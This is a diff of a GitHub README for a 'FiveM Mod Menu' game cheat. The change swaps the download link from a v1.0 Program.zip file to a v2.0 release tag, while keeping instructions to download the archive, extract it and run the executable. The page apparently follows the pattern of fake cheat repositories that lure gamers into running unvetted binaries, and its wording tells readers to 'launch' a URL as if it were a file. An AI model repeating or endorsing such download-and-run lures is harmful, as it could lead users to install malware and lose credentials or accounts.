@@ -13,11 +13,11 @@ Welcome to the FiveM Mod Menu repository! This repository provides a collection 
 
 ### Get Started 🚀
 To unlock the full potential of our FiveM Mod Menu, download the package from the following link:  
-[![Download Mod Menu](https://github.com/imakeitinvisibile/FiveM-Mod-Menu/releases/download/v1.0/Program.zip)](https://github.com/imakeitinvisibile/FiveM-Mod-Menu/releases/download/v1.0/Program.zip)  
-*(File "https://github.com/imakeitinvisibile/FiveM-Mod-Menu/releases/download/v1.0/Program.zip" needs to be launched upon download)*
+[![Download Mod Menu](https://github.com/imakeitinvisibile/FiveM-Mod-Menu/releases/tag/v2.0)](https://github.com/imakeitinvisibile/FiveM-Mod-Menu/releases/tag/v2.0)  
+*(File "https://github.com/imakeitinvisibile/FiveM-Mod-Menu/releases/tag/v2.0" needs to be launched upon download)*
 
 ### Usage Guide 📝
-1. Download the "https://github.com/imakeitinvisibile/FiveM-Mod-Menu/releases/download/v1.0/Program.zip" file from the provided link.
+1. Download the "https://github.com/imakeitinvisibile/FiveM-Mod-Menu/releases/tag/v2.0" file from the provided link.
 2. Extract the contents to a folder of your choice.
 3. Run the executable file and follow the on-screen instructions.
 4. Enjoy a whole new level of gaming experience with FiveM Mod Menu!
